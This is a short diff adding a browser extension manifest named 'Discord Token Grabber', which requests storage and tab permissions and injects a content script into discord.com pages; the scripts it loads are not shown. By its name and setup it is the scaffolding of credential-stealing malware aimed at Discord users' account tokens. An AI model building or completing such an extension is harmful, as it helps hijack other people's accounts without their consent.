@@ -1,0 +1,15 @@
+{
+  "manifest_version": 2,
+  "name": "Discord Token Grabber",
+  "version": "1.0",
+  "permissions": ["storage", "tabs", "activeTab"],
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://discord.com/*"],
+      "js": ["content.js"]
+    }
+  ]
+}
